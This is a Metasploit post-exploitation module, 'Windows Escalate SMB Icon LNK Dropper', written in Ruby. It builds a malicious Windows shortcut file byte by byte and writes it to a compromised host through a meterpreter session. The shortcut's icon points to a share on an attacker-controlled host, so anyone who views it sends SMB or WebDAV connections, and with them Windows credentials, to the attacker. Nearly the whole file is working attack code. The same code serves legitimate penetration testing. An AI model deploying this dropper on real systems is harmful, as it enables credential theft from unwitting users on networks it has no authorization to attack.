##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Escalate SMB Icon LNK Dropper',
        'Description'   => %q{
          This module drops a shortcut (LNK file) that has a ICON reference
          existing on the specified remote host, causing SMB and WebDAV
          connections to be initiated from any user that views the shortcut.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'mubix' ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
    register_options(
      [
        OptAddress.new("LHOST", [ true, "Host listening for incoming SMB/WebDAV traffic", nil]),
        OptString.new("LNKFILENAME", [ true, "Shortcut's filename", "Words.lnk"]),
        OptString.new("SHARENAME", [ true, "Share name on LHOST", "share1"]),
        OptString.new("ICONFILENAME", [ true, "File name on LHOST's share", "icon.png"])
      ])
  end

  def run
    print_status "Creating evil LNK"
    lnk = ""
    lnk << "\x4c\x00\x00\x00"                  #Header size
    lnk << "\x01\x14\x02\x00\x00\x00\x00\x00"  #Link CLSID
    lnk << "\xc0\x00\x00\x00\x00\x00\x00\x46"
    lnk << "\xdb\x00\x00\x00"                  #Link flags
    lnk << "\x20\x00\x00\x00"                  #File attributes
    lnk << "\x30\xcd\x9a\x97\x40\xae\xcc\x01"  #Creation time
    lnk << "\x30\xcd\x9a\x97\x40\xae\xcc\x01"  #Access time
    lnk << "\x30\xcd\x9a\x97\x40\xae\xcc\x01"  #Write time
    lnk << "\x00\x00\x00\x00"                  #File size
    lnk << "\x00\x00\x00\x00"                  #Icon index
    lnk << "\x01\x00\x00\x00"                  #Show command
    lnk << "\x00\x00"                          #Hotkey
    lnk << "\x00\x00"                          #Reserved
    lnk << "\x00\x00\x00\x00"                  #Reserved
    lnk << "\x00\x00\x00\x00"                  #Reserved
    lnk << "\x7b\x00"                          #IDListSize
    #sIDList
    lnk << "\x14\x00\x1f\x50\xe0\x4f\xd0\x20"
    lnk << "\xea\x3a\x69\x10\xa2\xd8\x08\x00"
    lnk << "\x2b\x30\x30\x9d\x19\x00\x2f"
    lnk << "C:\\"
    lnk << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    lnk << "\x00\x00\x00\x4c\x00\x32\x00\x00\x00\x00\x00\x7d\x3f\x5b\x15\x20"
    lnk << "\x00"
    lnk << "AUTOEXEC.BAT"
    lnk << "\x00\x00\x30\x00\x03\x00\x04\x00\xef\xbe\x7d\x3f\x5b\x15\x7d\x3f"
    lnk << "\x5b\x15\x14\x00\x00\x00"
    lnk << Rex::Text.to_unicode("AUTOEXEC.BAT")
    lnk << "\x00\x00\x1c\x00\x00\x00"
    #sLinkInfo
    lnk << "\x3e\x00\x00\x00\x1c\x00\x00\x00\x01\x00"
    lnk << "\x00\x00\x1c\x00\x00\x00\x2d\x00\x00\x00\x00\x00\x00\x00\x3d\x00"
    lnk << "\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00\x3e\x77\xbf\xbc\x10\x00"
    lnk << "\x00\x00\x00"
    lnk << "C:\\AUTOEXEC.BAT"
    lnk << "\x00\x00\x0e\x00"
    #RELATIVE_PATH
    lnk << Rex::Text.to_unicode(".\\AUTOEXEC.BAT")
    lnk << "\x03\x00"
    #WORKING_DIR
    lnk << Rex::Text.to_unicode("C:\\")
    #ICON LOCATION
    lnk << "\x1c\x00"
    lnk << Rex::Text.to_unicode("\\\\#{datastore['LHOST']}\\#{datastore['SHARENAME']}\\#{datastore['ICONFILENAME']}`")
    lnk << "\x00\x00\x03\x00\x00\xa0\x58\x00\x00\x00\x00\x00\x00\x00"
    lnk << "computer"
    lnk << "\x00\x00\x00\x00\x00\x00\x26\x4e\x06\x19\xf2\xa9\x31\x40\x91\xf0"
    lnk << "\xab\x9f\xb6\xb1\x6c\x84\x22\x03\x57\x01\x5e\x1d\xe1\x11\xb9\x48"
    lnk << "\x08\x00\x27\x6f\xe3\x1f\x26\x4e\x06\x19\xf2\xa9\x31\x40\x91\xf0"
    lnk << "\xab\x9f\xb6\xb1\x6c\x84\x22\x03\x57\x01\x5e\x1d\xe1\x11\xb9\x48"
    lnk << "\x08\x00\x27\x6f\xe3\x1f\x00\x00\x00\x00"

    print_status "Done. Writing to disk - #{session.fs.dir.pwd}\\#{datastore['LNKFILENAME']}"
    file = client.fs.file.new(datastore['LNKFILENAME'], 'wb')
    file.write(lnk)
    file.close
    print_status "Done. Wait for evil to happen.."
  end
end
